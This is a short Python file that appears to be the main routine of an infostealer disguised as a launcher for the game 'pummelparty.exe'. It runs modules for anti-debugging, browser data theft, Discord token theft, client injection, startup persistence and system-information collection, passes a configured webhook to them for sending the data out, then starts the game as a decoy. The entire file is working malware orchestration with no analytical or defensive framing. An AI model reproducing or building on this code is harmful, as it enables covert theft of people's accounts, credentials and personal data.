from components.antidebug import AntiDebug
from components.browsers import Browsers
from components.discordtoken import DiscordToken
from components.injection import Injection
from components.startup import Startup
from components.systeminfo import SystemInfo
from config import __CONFIG__
import os


def main():
    funcs = [
        AntiDebug,
        Browsers,
        DiscordToken,
        Injection,
        Startup,
        SystemInfo,
    ]

    if __CONFIG__['onerun'] == False:
        for func in funcs:
            if __CONFIG__[func.__name__.lower()]:
                if func.__init__.__code__.co_argcount == 2:
                    func(__CONFIG__['webhook'])
                else:
                    func()
        os.startfile("pummelparty.exe")
        __CONFIG__['onerun'] = True

    else:
        os.startfile("pummelparty.exe")
        
if __name__ == '__main__':
    main()
